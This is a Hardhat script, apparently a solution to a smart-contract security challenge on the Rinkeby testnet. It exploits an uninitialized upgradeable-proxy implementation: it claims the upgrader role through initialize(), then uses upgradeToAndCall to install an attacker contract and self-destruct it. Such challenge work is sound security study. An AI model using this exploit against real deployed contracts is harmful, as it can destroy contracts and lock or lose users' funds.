
const { ethers } = require("hardhat");

async function main() {

  const victimAddress = '0xbB0204ed8D4a569b988423b7107A0B4234c4c956';

  const signer = (await ethers.getSigners())[0];

  const EngineAttacker = await ethers.getContractFactory("EngineAttacker");
  const engineAttacker = await EngineAttacker.deploy();

  console.log("Engine attacker deployed to:", engineAttacker.address);

  const IMPLEMENTATION_SLOT = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'; // fixed memory slot for the implementation address on the proxy
  let implAddr = await ethers.getDefaultProvider('rinkeby').getStorageAt(victimAddress, IMPLEMENTATION_SLOT);
  // Output: '0x000000000000000000000000<20-byte-implementation-contract-address>'
  implAddr = '0x' + implAddr.slice(-40)
  // Output: '0x<20-byte-implementation-contract-address>'

  console.log("Engine implementation address:", implAddr);

  // direct call to the uninitialized implementation contract to become the upgrader
  const initilizeInterface = new ethers.utils.Interface(["function initialize()"]);
  const initilizeCallData = initilizeInterface.encodeFunctionData("initialize", []);

  await (await signer.sendTransaction({ to: implAddr, data: initilizeCallData })).wait();

  const attackInterface = new ethers.utils.Interface(["function attack()"]);
  const attackCallData = attackInterface.encodeFunctionData("attack", []);

  const upgradeToAndCallInterface = new ethers.utils.Interface(["function upgradeToAndCall(address newImplementation, bytes memory data)"]);
  // upgrade the attacker contract as the new implementation and execute attack() to selfdestruct
  const upgradeToAndCallCallData = upgradeToAndCallInterface.encodeFunctionData("upgradeToAndCall", [engineAttacker.address, attackCallData]); 

  await (await signer.sendTransaction({ to: implAddr, data: upgradeToAndCallCallData })).wait();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
